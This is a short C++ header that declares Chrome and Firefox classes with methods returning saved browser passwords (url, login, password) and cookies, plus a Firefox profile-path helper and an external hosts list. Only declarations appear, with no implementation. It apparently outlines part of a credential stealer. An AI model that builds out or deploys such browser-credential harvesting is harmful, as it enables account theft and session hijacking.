#ifndef DATA_EXTRACTOR_H
#define DATA_EXTRACTOR_H

#include <string>
#include <list>
#include <vector>

/*
                               url, login, password
    static std::list< std::vector< std::wstring > > get_passwords();

                           url, cookie_name, cookie_value
    static std::list< std::vector< std::wstring > > get_cookies();
*/


#define HOSTS_COUNT 0
extern const char* hosts_list[];


class Chrome
{
public:
    static std::list< std::vector< std::wstring > > GetPasswords();
    static std::list< std::vector< std::wstring > > GetCookies();
};


class Firefox
{
public:
    static std::list< std::vector< std::wstring > > GetPasswords();
    static std::list< std::vector< std::wstring > > GetCookies();
    static std::wstring GetProfilePath();

    static void Init();

    static bool is_init;
};


#endif // DATA_EXTRACTOR_H
